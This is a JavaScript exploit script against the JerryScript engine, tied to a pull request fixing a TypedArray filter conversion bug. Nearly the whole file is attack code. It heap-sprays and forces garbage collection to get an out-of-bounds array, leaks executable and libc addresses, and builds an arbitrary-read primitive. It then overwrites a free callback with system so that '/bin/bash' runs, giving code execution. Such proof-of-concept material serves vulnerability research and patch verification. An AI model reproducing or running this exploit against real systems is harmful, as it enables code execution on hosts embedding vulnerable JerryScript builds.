// https://github.com/jerryscript-project/jerryscript/pull/4794
/*
  During the execution of the TypedArray filter method it is possible
  to have a different sized output TypedArray than the input one.
  When copying the data to the output array the values must be
  correctly converted to the output TypedArray's value range.
*/

function hex(val) {
  return "0x" + val.toString(16)
}

// /bin/bash
var os_cmd = [0x6e69622f, 0x7361622f, 0x68];

var filtered_buffer = new Uint8Array(0x300);
var uint32_oob = new Uint32Array(0x100);
var uint32_arr = new Uint32Array(0x100);
var spray = [];
for (let i = 0; i < 0x2000; i++) {
  spray.push({a: 1});
}

var leng = 0xc0;
for (let i = 0; i < leng; i++) uint32_arr[i] = 0xfff;
uint32_arr[leng++] = 0x21;
uint32_arr[leng++] = 0;
uint32_arr[leng++] = 0x117;
uint32_arr[leng++] = 0x313370 >> 2;

uint32_arr.constructor = Uint8Array;
// Wipe references to GC free this memory
filtered_buffer = 0;
spray = 0;
/**
 * We alloc "filtered_buffer", wipe your reference and call gc, freeing this buffer, shortly thereafter, call the filter method
 * this form, output buffer will be allocated behind the "uint32_oob", allowing overwrite length
 */
gc();
/**
 * For the filter result are allocated a buffer with "Uint8Array(0x100)" size, which obvious small than "new Uint32Array(0x100)"
 */
uint32_arr.filter(_ => true);

print("[+] uint32_oob.length:", hex(uint32_oob.length));

var leak_lo = 0;
var leak_hi = 0;
for (let i = 1; i < 0x1000; i++) {
  if (uint32_oob[i] < 0x6000 && uint32_oob[i] > 0x5000 && uint32_oob[i - 1] != 0) {
    leak_lo = uint32_oob[i - 1];
    leak_hi = uint32_oob[i];
    break;
  }
}
var leak = (BigInt(leak_hi) << 32n) + BigInt(leak_lo);

// now we have valid address. turn the flag to 1 and get AAR primitive.
uint32_oob[0x102] = 0x10117;
function aar32(addr) {
  uint32_oob[0x104] = Number(addr & 0xffffffffn);
  uint32_oob[0x105] = Number(addr >> 32n);
  return uint32_arr[0];
}
function aar(addr) {
  return BigInt(aar32(addr)) + (BigInt(aar32(addr + 4n)) << 32n);
}

var target = leak - 0x3000n;
var heap_leak = 0n;
for (let i = 0; i < 0x1000; i++) {
  if (aar32(target + BigInt(i) * 8n) < 0x1000) {
    if ((aar32(target + BigInt(i) * 8n + 8n) & 0xffff) == 0x70) {
      heap_leak = target + BigInt(i) * 8n;
      break;
    }
  }
}
if (heap_leak == 0n) {
  print("[-] heap_leak not found. check offset.");
  while (1) { }
}
print("[+] heap_leak:", hex(heap_leak));
var ptr_jerryx_handler_assert = heap_leak + 0x148n;
var jerryx_handler_assert = aar(ptr_jerryx_handler_assert);
var exe_base = jerryx_handler_assert - 0x4eb93n;
var ptr_got_free = exe_base + 0x68eb8n;
var got_free = aar(ptr_got_free);
var libc_base = got_free - 0xa5460n;
var system = libc_base + 0x50d60n;

print("[+] exe_base:", hex(exe_base));
print("[+] libc_base:", hex(libc_base));
print("[+] system:", hex(system));

// get addr of uint32_oob to locate our command addr
// mark for search
uint32_oob[0] = 0x11221122;
uint32_oob[1] = 0x33443344;

// you can use aaw here, but this way is more stable.
for (let i = 0; i < os_cmd.length; i++) {
  uint32_oob[i + 2] = os_cmd[i];
}
var addr_uint32_oob = 0;
for (let i = 0; i < 0x1000; i++) {
  if (aar32(heap_leak + BigInt(i) * 8n) == 0x11221122) {
    if (aar32(heap_leak + BigInt(i) * 8n + 4n) == 0x33443344) {
      addr_uint32_oob = heap_leak + BigInt(i) * 8n;
      break;
    }
  }
}
if (addr_uint32_oob == 0n) {
  print("[-] uint32_oob not found. check offset.");
  while (1) { }
}
print("[+] uint32_oob:", hex(addr_uint32_oob));

// change uint32_arr external pointer to our command
uint32_oob[0x104] = Number((addr_uint32_oob + 8n) & 0xffffffffn);
uint32_oob[0x105] = Number((addr_uint32_oob + 8n) >> 32n);

// change uint32_arr free_cb to system
uint32_oob[0x106] = Number(system & 0xffffffffn);
uint32_oob[0x107] = Number(system >> 32n);

// wipe uint32_arr reference
uint32_arr = 0;
// trigger uint32_arr free_cb
print("[+] Trigging free_cb...")
gc();

// we need this to prevent any other destructor call
while (1) { }
